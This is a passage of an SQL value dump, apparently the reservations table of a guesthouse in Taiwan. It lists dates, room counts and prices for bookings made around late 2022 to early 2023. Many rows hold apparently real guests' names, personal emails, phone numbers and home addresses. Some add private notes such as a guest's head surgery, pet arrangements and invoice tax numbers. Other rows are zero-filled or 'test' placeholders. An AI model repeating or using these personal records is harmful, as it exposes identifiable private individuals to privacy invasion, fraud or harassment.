(37, 1668134536, NULL, 1669075200, 1669161600, 1, 1, NULL, NULL, 0, NULL, 1000, 0, 1000, NULL, NULL, NULL, 1, 'Administrator', '鄭', 'goh2078@goh.org.tw', '', '隨意', '236', '天龍國', '', '0981761985', '', '', 1, NULL, NULL, 'arrival'),
(38, 1668134698, NULL, 1669680000, 1669766400, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, 1, 'Administrator', '鄭', 'goh2078@goh.org.tw', '', '隨意', '236', '天龍國', '', '0981761985', '', '', 1, NULL, NULL, 'arrival'),
(39, 1668134940, NULL, 1669161600, 1669248000, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, 1, 'Administrator', '鄭', 'goh2078@goh.org.tw', '', '隨意', '236', '天龍國', '', '0981761985', '', '', 1, NULL, NULL, 'arrival'),
(40, 1668135065, NULL, 1669766400, 1669852800, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, 1, 'Administrator', '鄭', 'goh2078@goh.org.tw', '', '隨意', '236', '天龍國', '', '0981761985', '', '', 1, NULL, NULL, 'arrival'),
(41, 1668409179, 1668409179, 1670025600, 1670112000, 1, 6, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '2', '2', '2', '', '2', '2', '2', '', '2', '', '', 4, NULL, NULL, 'arrival'),
(42, 1668560249, 1668560440, 1670630400, 1670716800, 1, 12, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '2', '2', '2', '', '2', '2', '2', '', '2', '', '', 4, NULL, NULL, 'arrival'),
(43, 1668560508, 1668560661, 1672444800, 1672531200, 1, 6, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '2', '2', '2', '', '2', '2', '2', '', '2', '', '', 4, NULL, NULL, 'arrival'),
(44, 1668560741, 1668560755, 1670025600, 1670112000, 1, 6, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '簡', '名弘', 's10017@goh.org.tw', '', '台東市中興路一段110號', '950', '台東', '', '0928542052', '', '', 4, NULL, NULL, ''),
(45, 1669339591, 1669681540, 1672012800, 1672099200, 1, 2, 0, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '慧菁', '林', 'arjing1030@gmail.com', '', '0', '0', '0', '', '0963297790', '', '', 4, NULL, NULL, 'arrival'),
(46, 1669681851, 1669681892, 1670630400, 1670716800, 1, 6, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '客滿', '專用', 's10017@goh.org.tw', '', '台東市中興路一段110號', '950', '台東', '', '0928542052', '', '', 4, NULL, NULL, ''),
(47, 1669682016, 1669682040, 1670025600, 1670112000, 1, 6, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '客滿', '專用2', 's10017@goh.org.tw', '', '台東市中興路一段110號', '950', '台東', '', '0928542052', '', '', 4, NULL, NULL, ''),
(48, 1669682416, 1669682416, 1670630400, 1670716800, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '專用', '客滿', 's10017@goh.org.tw', '', '1', '089', 'tt', '', '0928542052', '', '', 4, NULL, NULL, ''),
(49, 1669859648, NULL, 1670544000, 1670630400, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '昌波', '魏', 'navigate61@gmail.com', '', '福興村12鄰福德街83號', '973', '吉安鄉', '038350380', '0928817740', '', '', 1, NULL, NULL, 'arrival'),
(50, 1670036639, NULL, 1671148800, 1671235200, 1, 8, NULL, NULL, 0, NULL, 5600, 0, 5600, NULL, NULL, NULL, NULL, '玉玲', '李', 'kathy5809@yahoo.com.tw', '', '台中市北屯區松竹五路一段121號2樓之3', '406', '台中', '', '0910037954', '', '', 1, NULL, NULL, 'arrival'),
(51, 1670076253, NULL, 1671148800, 1671235200, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '玉玲', '李', 'kathy5809@yahoo.com.tw', '', '台中市北屯區松竹五路一段121號二樓之三', '406', '台中', '', '0910037954', '', '', 1, NULL, NULL, 'arrival'),
(52, 1670233144, NULL, 1671580800, 1671667200, 1, 2, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '淑鈴', '黃', 'jess272841@gmail.com', '', '美村路一段22號7F-3', '403', '台中市', '', '0911123465', '', '因頭部開過刀,拜託您安排房間位置,請幫忙避開熱鬧區(聲音),謝謝您~\r\n請問有車佔可停車嗎？', 1, NULL, NULL, 'arrival'),
(53, 1670473187, NULL, 1670803200, 1670889600, 1, 1, NULL, NULL, 0, NULL, 1000, 0, 1000, NULL, NULL, NULL, NULL, '繁嘉', '孟', 'vickielourdes@gmail.com', '社團法人台灣露德協會', '建中街35巷7號', '970', '花蓮縣', '', '0905538258', '', '', 1, NULL, NULL, 'arrival'),
(54, 1670662740, NULL, 1670803200, 1671062400, 3, 1, NULL, NULL, 0, NULL, 3600, 0, 3600, NULL, NULL, NULL, NULL, '貞如', '陳', 'jeanjuchen@gmail.com', '', '', '', '', '', '0916681186', '', '', 1, NULL, NULL, 'arrival'),
(55, 1670807358, NULL, 1672444800, 1672531200, 1, 1, NULL, NULL, 0, NULL, 3600, 0, 3600, NULL, NULL, NULL, NULL, '子菁', '陳', 'g113015k56@gmail.com', '', '', '', '', '', '0939770603', '', '', 1, NULL, NULL, 'arrival'),
(56, 1671033045, NULL, 1672099200, 1672272000, 2, 1, NULL, NULL, 0, NULL, 2000, 0, 2000, NULL, NULL, NULL, NULL, '育帆', '詹', 'yutofan@hotmail.com', '', '嘉義縣番路鄉下坑村下坑41之30號', '602', '嘉義', '', '0978758759', '', '', 1, NULL, NULL, 'arrival'),
(57, 1671070179, NULL, 1671235200, 1671321600, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '麗琴', '羅', 'suey107@yahoo.com.tw', '', '', '', '', '', '0927877008', '', '', 1, NULL, NULL, 'arrival'),
(58, 1671072567, NULL, 1672185600, 1672358400, 2, 3, NULL, NULL, 0, NULL, 4800, 0, 4800, NULL, NULL, NULL, NULL, '承勳', '吳', 'cathy.hsuwu@gmail.com', '', '', '', '', '', '0935875523', '', '使用住宿卷, 之前與簡先生聯繫過, 住宿卷使用可以到12/30之前使用完畢。', 1, NULL, NULL, 'arrival'),
(59, 1671518514, NULL, 1672444800, 1672531200, 1, 1, NULL, NULL, 0, NULL, 2200, 0, 2200, NULL, NULL, NULL, 9, '孟娟', '陳', 'chengwinni0721@gmail.com', '', '豐原區綠山街福陽巷16號 ', '420', '台中市 ', '0912965334', '0912965334', '', '', 1, NULL, NULL, 'arrival'),
(60, 1671557433, NULL, 1672099200, 1672358400, 3, 2, NULL, NULL, 0, NULL, 3600, 0, 3600, NULL, NULL, NULL, NULL, '適誠', '游', 'hermit.yu@gmail.com', '', '', '', '', '', '0928550111', '', '攜帶寵物', 1, NULL, NULL, 'arrival'),
(61, 1671607194, 1671607194, 1672444800, 1672444800, 0, 2, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '0', '0', '00', '', '0', '0', '0', '', '00', '', '', 4, NULL, NULL, 'arrival'),
(62, 1671761421, NULL, 1671926400, 1672012800, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, 2, '名弘', '簡', 's10017@goh.org.tw', '', '950', '950', '台東', '', '0928542052', '', '', 1, NULL, NULL, 'arrival'),
(63, 1671774027, 1671774027, 1672531200, 1674345600, 21, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '淑惠', '簡', '0', '', '0', '950', '00', '', '00', '', '', 4, NULL, NULL, ''),
(64, 1671774133, 1671774133, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(65, 1671774157, 1671774157, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(66, 1671774183, 1671774183, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(67, 1671774204, 1671774204, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(68, 1671774222, 1671774222, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(69, 1671775876, NULL, 1672444800, 1672531200, 1, 4, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '雨濃', '林', 'uteki.lin1024@gmail.com', '', '', '', '', '', '0938877638', '', '', 1, NULL, NULL, 'arrival'),
(70, 1671776166, 1671777182, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(71, 1671776204, 1671776204, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(72, 1671776239, 1671776239, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(73, 1671777200, 1671777200, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(74, 1671777222, 1671777222, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(75, 1671777241, 1671777241, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(76, 1671833749, NULL, 1672444800, 1672617600, 2, 2, NULL, NULL, 0, NULL, 2600, 0, 2600, NULL, NULL, NULL, 10, '佑漢', '林', 'a0984174290@gmail.com', '', '花蓮縣富里鄉萬寧村五鄰二號', '98392', '花蓮縣', '', '0903619166', '', '', 1, NULL, NULL, 'arrival'),
(77, 1671857130, 1671857130, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(78, 1671857160, 1671857160, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(79, 1671874313, 1671874313, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(80, 1671874339, 1671874339, 1672444800, 1672531200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(81, 1671882750, 1671882750, 1672704000, 1672790400, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(82, 1672282500, NULL, 1677196800, 1677542400, 4, 1, NULL, NULL, 0, NULL, 5200, 0, 5200, NULL, NULL, NULL, NULL, '胡小姐', '胡', 'happiness.en@gmail.com', '', '台北市大安區永康街61巷11-3號4樓', '106', '台北市', '', '0988600699', '', '', 1, NULL, NULL, 'arrival'),
(83, 1672494107, NULL, 1672790400, 1672876800, 1, 1, NULL, NULL, 0, NULL, 2400, 0, 2400, NULL, NULL, NULL, NULL, '恕涵', '曾', 'Just_brook@hotmail.com', '', '', '', '', '', '0919355218', '', '', 1, NULL, NULL, 'arrival'),
(84, 1672581885, 1672966594, 1682121600, 1682208000, 1, 1, 0, NULL, 0, NULL, 2200, 0, 2200, NULL, NULL, NULL, 11, '偉翔', '黃', 'weihsiang0822@gmail.com', '', '彰化縣芬園鄉竹林村竹東路142號', '502', '彰化縣', '0916898122', '00', '', '', 4, NULL, NULL, 'arrival'),
(85, 1672582717, 1672966547, 1682121600, 1682208000, 1, 2, 1, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, 11, '偉翔', '黃', 'weihsiang0822@gmail.com', '', '彰化縣芬園鄉竹林村竹東路142號', '502', '彰化縣', '0916898122', '0916898122', '', '', 2, NULL, NULL, 'arrival'),
(88, 1672801064, 1672801064, 1673222400, 1673308800, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, 'test', 'test', 'test', '', 'test', 'test', 'test', '', 'test', '', '', 4, NULL, NULL, ''),
(89, 1672801175, NULL, 1673049600, 1673136000, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, 2, '名弘', '簡', 's10017@goh.org.tw', '', '950', '950', '台東', '', '0928542052', '', '', 1, NULL, NULL, 'arrival'),
(90, 1672833254, NULL, 1676678400, 1676851200, 2, 4, NULL, NULL, 0, NULL, 5200, 0, 5200, NULL, NULL, NULL, NULL, '逸萍', '周', 'jchou1959@gmail.com', '', '永和區永貞路332巷24號3樓', '234', '新北市', '0286604295', '0933019141', '', '', 1, NULL, NULL, 'arrival'),
(91, 1672915027, NULL, 1680393600, 1680566400, 2, 3, 1, NULL, 0, NULL, 4800, 0, 4800, NULL, NULL, NULL, NULL, '瑩琇', '盧', 's11351@yahoo.com.tw', '', '', '', '', '', '0912999299', '', '', 1, NULL, NULL, 'arrival'),
(92, 1672922332, NULL, 1677801600, 1677974400, 2, 2, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, 12, '錦忠', '許', 'jon.cc.hsu@gmail.com', '', '台北市延壽街330巷17弄8號7樓', '105', '台北市', '0928143111', '0928143111', '', '', 1, NULL, NULL, 'arrival'),
(93, 1672966147, 1672966147, 1680307200, 1680480000, 2, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '葉', '芳枝', '0', '', '0', '0', '0', '', '0933-965-611', '', '', 4, NULL, NULL, ''),
(94, 1672966810, 1672966810, 1681689600, 1682208000, 6, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '鐵人', '鐵人', '0', '', '0', '950', '00', '', '00', '', '', 4, NULL, NULL, ''),
(95, 1672967078, 1672967078, 1677801600, 1677974400, 2, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '三鐵', '三鐵', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(96, 1672967735, NULL, 1673308800, 1673568000, 3, 1, NULL, NULL, 0, NULL, 3600, 0, 3600, NULL, NULL, NULL, 2, '名弘', '簡', 's10017@goh.org.tw', '', '950', '950', '台東', '', '0928542052', '', '', 1, NULL, NULL, 'arrival'),
(97, 1672968528, NULL, 1677628800, 1677715200, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, 2, '名弘', '簡', 's10017@goh.org.tw', '', '950', '950', '台東', '', '0928542052', '', '', 1, NULL, NULL, 'arrival'),
(98, 1672968731, 1672968731, 1679011200, 1679184000, 2, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '先生', '龔', '0', '', '0', '950', '0', '', '0', '', '', 4, NULL, NULL, ''),
(99, 1672969033, 1672969033, 1675209600, 1676073600, 10, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(100, 1672969151, 1672969151, 1675209600, 1675641600, 5, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(101, 1672969298, 1672969298, 1675468800, 1675641600, 2, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(102, 1672971112, 1672971112, 1676246400, 1676419200, 2, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '賴金福', '賴金福', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(103, 1672971201, 1672971666, 1677283200, 1677542400, 3, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '彭氰俞', '彭氰俞', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(104, 1672971552, 1672971552, 1676592000, 1676851200, 3, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '繼賢', '黃', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(105, 1673096367, NULL, 1677369600, 1677456000, 1, 2, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '謙宜', '買', 'Jenny10090123456520@gmail.com', '', '', '', '', '', '', '', '', 1, NULL, NULL, 'arrival'),
(106, 1673591799, 1673591799, 1675468800, 1675641600, 2, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(107, 1673767207, NULL, 1680393600, 1680480000, 1, 2, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '彥廷', '陳', 'rew5454@gmail.com', '', '桃園市平鎮區廣泰路289巷11號', '', '', '', '0925591316', '', '', 1, NULL, NULL, 'arrival'),
(108, 1674027148, 1674027148, 1675814400, 1676073600, 3, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(109, 1674264518, NULL, 1675209600, 1675382400, 2, 2, NULL, NULL, 0, NULL, 2400, 0, 2400, NULL, NULL, NULL, NULL, '靈', '莊', 'dancingling23@gmail.com', '', '', '', '', '', '0921381180', '', '', 1, NULL, NULL, 'arrival'),
(110, 1674269194, NULL, 1674864000, 1675036800, 2, 3, NULL, NULL, 0, NULL, 4000, 0, 4000, NULL, NULL, NULL, NULL, '文星', '羅', 'gang950316@yahoo.com.tw', '', '桃園市桃園區守法路名人巷7號7樓', '33053', '桃園', '(+886) 986712965', '0986712965', '', '', 1, NULL, NULL, 'arrival'),
(111, 1675053774, NULL, 1675814400, 1675987200, 2, 1, NULL, NULL, 0, NULL, 2400, 0, 2400, NULL, NULL, NULL, NULL, '繁嘉', '孟', 'vickielourdes@gmail.com', '社團法人台灣露德協會', '花蓮縣花蓮市建中街35巷7號', '970', '花蓮市', '', '0905538258', '', '請開立統編48761056', 1, NULL, NULL, 'arrival'),
(112, 1675064581, 1675064581, 1675468800, 1675555200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(113, 1675064608, 1675064608, 1675468800, 1675555200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(114, 1675307306, 1675307306, 1676073600, 1676160000, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(115, 1675307327, 1675307327, 1676073600, 1676160000, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '00', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(116, 1675307363, 1675307363, 1676073600, 1676160000, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(117, 1675307385, 1675307385, 1676073600, 1676160000, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(118, 1675307461, 1675307461, 1675555200, 1676073600, 6, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(119, 1675342872, NULL, 1679788800, 1679961600, 2, 4, NULL, NULL, 0, NULL, 4800, 0, 4800, NULL, NULL, NULL, NULL, '逸萍', '周', 'jchou1959@gmail.com', '', '永和區永貞路332巷24號3樓', '234', '新北市', '', '0933019141', '', '', 1, NULL, NULL, 'arrival'),
(120, 1675437464, NULL, 1679011200, 1679097600, 1, 5, NULL, NULL, 0, NULL, 3600, 0, 3600, NULL, NULL, NULL, NULL, '立婷', '林', 'tina9090587@gmail.com', '', '', '', '', '', '0988350281', '', '', 1, NULL, NULL, 'arrival'),
(121, 1675473884, 1675473884, 1679011200, 1679184000, 2, 30, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '0', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(122, 1675474013, 1675474013, 1677628800, 1677801600, 2, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(123, 1675474050, 1675474050, 1677974400, 1679011200, 12, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(124, 1675474086, 1675474086, 1679184000, 1680220800, 12, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(125, 1675474181, 1675474181, 1680307200, 1680739200, 5, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '淑娟', '陳', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(126, 1675474254, 1675474254, 1680480000, 1680566400, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(127, 1675474341, 1675474343, 1680307200, 1680566400, 3, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(128, 1675474472, 1675474472, 1675555200, 1675900800, 4, 8, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(129, 1675474681, 1675474681, 1676073600, 1676160000, 1, 11, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(130, 1675929323, 1675929323, 1680307200, 1680566400, 3, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(131, 1675929405, 1675929405, 1680307200, 1680739200, 5, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(132, 1676194941, NULL, 1677369600, 1677456000, 1, 4, NULL, NULL, 0, NULL, 2400, 0, 2400, NULL, NULL, NULL, NULL, '安妮', '林', 'lollipop543520@gmail.com', '', '百忍街50巷2弄7號6樓', '231', '新店區', '0983248477', '0983248477', '', '已電話聯絡請保留寵物樓層，現場補差價$800(房價$400+寵物$400)', 1, NULL, NULL, 'arrival'),
(133, 1676261321, NULL, 1676419200, 1676592000, 2, 2, NULL, NULL, 0, NULL, 2400, 0, 2400, NULL, NULL, NULL, NULL, '貞如', '陳', 'jeanjuchen@gmail.com', '', '', '', '', '', '0916681186', '', '', 1, NULL, NULL, 'arrival'),
(134, 1676506426, NULL, 1680566400, 1680739200, 2, 1, NULL, NULL, 0, NULL, 4800, 0, 4800, NULL, NULL, NULL, NULL, '郁嫺', '林', 'poki1125lin@gmail.com', '', '', '', '', '', '0928885175', '', '', 1, NULL, NULL, 'arrival'),
(135, 1676506576, NULL, 1680480000, 1680566400, 1, 1, NULL, NULL, 0, NULL, 1800, 0, 1800, NULL, NULL, NULL, NULL, '郁嫺', '林', 'poki1125lin@gmail.com', '', '', '', '', '', '0928885175', '', '', 1, NULL, NULL, 'arrival'),
(136, 1676515412, 1676515412, 1680307200, 1680739200, 5, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(137, 1676515806, 1676515806, 1680393600, 1680480000, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(138, 1676516070, 1676516070, 1680480000, 1680566400, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '芳枝', '葉', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(139, 1676516143, 1676516143, 1680307200, 1680480000, 2, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(140, 1676516273, 1676516273, 1680307200, 1680480000, 2, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '郁嫻', '林', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(141, 1676538128, NULL, 1677024000, 1677110400, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '昌波', '魏', 'navigate61@gmail.com', '財團法人陽光社會福利基金會', '福興村12鄰福德街83號', '973', '吉安鄉', '038350380', '0928817740', '', '發票需開立統編 04180692', 1, NULL, NULL, 'arrival'),
(142, 1676810436, NULL, 1680307200, 1680652800, 4, 1, NULL, NULL, 0, NULL, 4200, 0, 4200, NULL, NULL, NULL, NULL, '碧如', '賴', 'pipijcsb@yahoo.com.tw', '', '', '', '', '', '0944088086', '', '', 1, NULL, NULL, 'arrival'),
(143, 1676951980, NULL, 1677283200, 1677369600, 1, 1, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '叔鋒', '林', 'baomeilisa@gmail.com', '', '新竹市東區中華路二段302號', '', '', '', '0963304259', '', '', 1, NULL, NULL, 'arrival'),
(144, 1677901457, NULL, 1680393600, 1680480000, 1, 3, NULL, NULL, 0, NULL, 1800, 0, 1800, NULL, NULL, NULL, NULL, '瑜安', '王', 'a06140102@gmail.com', '', '', '', '', '', '0988812966', '', '', 1, NULL, NULL, 'arrival'),
(145, 1677911031, 1677911031, 1680307200, 1680652800, 4, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(146, 1677911592, 1677911592, 1680998400, 1681084800, 1, 20, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(147, 1678163529, NULL, 1680307200, 1680566400, 3, 3, NULL, NULL, 0, NULL, 5800, 0, 5800, NULL, NULL, NULL, NULL, '淑筠', '曾', 'vicky010234@gmail.com', '', '頭份市中華路953巷3號11樓', '351', '苗栗縣', '911503206', '0911503206', '', '', 1, NULL, NULL, 'arrival'),
(148, 1678884845, NULL, 1679443200, 1679529600, 1, 2, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '居雯', '于', 'a0929125666@gmail.com', '', '高雄市左營區', '', '', '', '0929125666', '', '', 1, NULL, NULL, 'arrival'),
(149, 1679197604, NULL, 1682380800, 1682467200, 1, 1, NULL, NULL, 0, NULL, 1000, 0, 1000, NULL, NULL, NULL, NULL, '宗儒', '楊', 'shiweriya@hotmail.com', '', '', '', '', '', '0963353018', '', '', 1, NULL, NULL, 'arrival'),
(150, 1679271950, NULL, 1680307200, 1680393600, 1, 2, 1, NULL, 0, NULL, 2200, 0, 2200, NULL, NULL, NULL, NULL, '芷環', '翁', 'likedoraemon@gmail.com', '', '高雄市鳳山區鳳頂路229號8樓之10', '830', '高雄市', '0938033595', '', '', '', 1, NULL, NULL, 'arrival'),
